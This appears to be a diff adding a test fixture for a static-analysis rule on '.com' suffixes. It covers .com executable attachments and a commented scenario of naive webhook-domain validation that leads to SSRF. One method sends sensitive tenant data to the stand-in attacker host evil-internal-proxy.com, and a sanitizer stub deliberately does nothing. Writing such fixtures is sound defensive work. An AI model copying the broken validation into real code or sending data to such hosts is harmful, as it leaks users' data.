@@ -1,0 +1,86 @@
+class suffix {
+
+    // --- sink functions ---
+    processFile(filename) {
+    }
+
+    logAccess(target) {
+    }
+
+
+    // CASE 1: .com suffix passed to processFile
+    dotComFile() {
+        def filename = "setup.com";
+        this.processFile(filename);
+    }
+
+    // CASE 2: safe .pdf file — no suffix match
+    safeFile() {
+        def filename = "report.pdf";
+        this.processFile(filename);
+    }
+
+    // CASE 3: .com domain passed directly as string
+    dotComDomain() {
+        def domain = "backup.com";
+        this.logAccess(domain);
+    }
+
+    // CASE 4: attacker uses branching to try to confuse static analysis.
+    emailMalwareAttachment(is_manager) {
+        def attachment = "report.pdf";
+        if (is_manager) {
+            attachment = "invoice_2024.com";
+        } else {
+            attachment = "statement_q4.com";
+        }
+        this.processFile(attachment);
+    }
+
+    /*
+        Real-world scenario: Naive Domain Validation leading to SSRF / Data Exfiltration.
+
+        A SaaS application allows users to configure a custom webhook to receive
+        real-time updates. To prevent users from probing internal IP addresses
+        (like 192.168.x.x or localhost), the developers implemented a naive
+        validation rule: they assume that if a domain ends with ".com", it must
+        be a legitimate external public server.
+
+        An attacker wants to exfiltrate sensitive data or trigger an SSRF.
+        They register a malicious domain, e.g., "evil-internal-proxy.com",
+        which they control. Alternatively, they could use a domain that
+        resolves to an internal IP via DNS rebinding.
+
+        The system accepts "evil-internal-proxy.com" because it satisfies the
+        ".com" suffix check. The backend then constructs the final URL by
+        hardcoding the protocol: "https://" + domain + "/api/events".
+
+        The server executes an HTTP GET/POST to this dynamically built URL.
+        This leaks the system's payload to the attacker's server.
+
+    */
+
+
+    executeSyncVulnerable() {
+        def user_input_domain = "evil-internal-proxy.com";
+
+        def safe_domain = this.enforceDotComSuffix(user_input_domain);
+
+        def target_url = "https://evil-internal-proxy.com/api/events";
+
+        this.dispatchWebhook(target_url, "sensitive_tenant_data_payload");
+    }
+
+    dispatchWebhook(url, payload) {
+        // Mock method representing the internal HTTP client dispatching the request
+    }
+
+    enforceDotComSuffix(domain) {
+        // Models a BROKEN/NAIVE sanitizer:
+        // It checks if the string ends with ".com" and allows it.
+        return domain;
+    }
+
+
+
+}
